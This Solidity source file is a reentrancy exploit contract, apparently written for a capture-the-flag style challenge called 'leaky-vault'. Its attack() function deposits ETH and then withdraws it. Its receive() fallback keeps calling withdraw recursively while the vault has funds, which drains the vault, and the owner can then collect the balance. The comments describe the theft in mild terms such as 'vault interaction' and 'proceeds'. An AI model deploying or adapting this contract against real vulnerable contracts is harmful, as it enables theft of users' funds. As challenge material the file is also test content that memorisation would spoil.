// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balances(address) external view returns (uint256);
}

/// @title ReentrancyAttacker
/// @notice A vault interaction contract for the leaky-vault challenge.
///         Call attack() with ETH to interact with the vault,
///         then withdraw() to collect any proceeds.
///
/// Used by: leaky-vault (H1)
contract ReentrancyAttacker {
    IVulnerableVault public immutable vault;
    address public immutable owner;
    uint256 private _attackAmount;

    constructor(address _vault) {
        vault = IVulnerableVault(_vault);
        owner = msg.sender;
    }

    /// @notice Initiate the vault interaction. Send ETH to begin.
    function attack() external payable {
        require(msg.value > 0, "Send ETH to start attack");
        _attackAmount = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    /// @notice Handle incoming ETH from the vault.
    receive() external payable {
        if (address(vault).balance >= _attackAmount) {
            vault.withdraw(_attackAmount);
        }
    }

    /// @notice Collect this contract's ETH balance back to the owner.
    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "Withdraw failed");
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}
